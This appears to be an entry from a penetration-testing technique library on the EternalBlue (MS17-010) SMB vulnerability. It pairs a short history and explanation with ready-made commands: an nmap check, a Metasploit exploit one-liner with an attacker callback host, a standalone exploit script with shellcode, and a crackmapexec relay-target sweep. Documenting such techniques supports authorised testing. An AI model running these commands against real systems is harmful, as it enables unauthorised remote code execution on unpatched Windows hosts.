---
id: init-007
title: "SMB Exploitation (EternalBlue MS17-010)"
category: initial_access
tags: [eternalblue, ms17-010, smb, metasploit, nsa-exploit, windows]
platform: [windows]
commands:
  - "nmap -p 445 --script smb-vuln-ms17-010 <target-ip>"
  - "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <target-ip>; set LHOST <attacker-ip>; run'"
  - "python3 eternalblue.py <target-ip> shellcode/sc_x64.bin"
  - "crackmapexec smb <target-subnet>/24 --gen-relay-list relay-targets.txt"
references:
  - "https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/"
  - "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010"
---

EternalBlue (MS17-010) is a critical remote code execution vulnerability in the Windows SMBv1 implementation that was developed by the NSA and leaked by the Shadow Brokers in 2017, subsequently used in the WannaCry and NotPetya worm outbreaks. The vulnerability allows an unauthenticated attacker to execute arbitrary code on any unpatched Windows system with SMB (port 445) exposed, by sending a specially crafted SMB packet that triggers a buffer overflow in the kernel SMB driver (`srv.sys`). Despite being patched since March 2017 (MS17-010), the vulnerability remains exploitable against unpatched legacy systems, internal hosts never exposed to Windows Update, and environments where patching was deferred, making it a frequent finding in internal penetration tests.
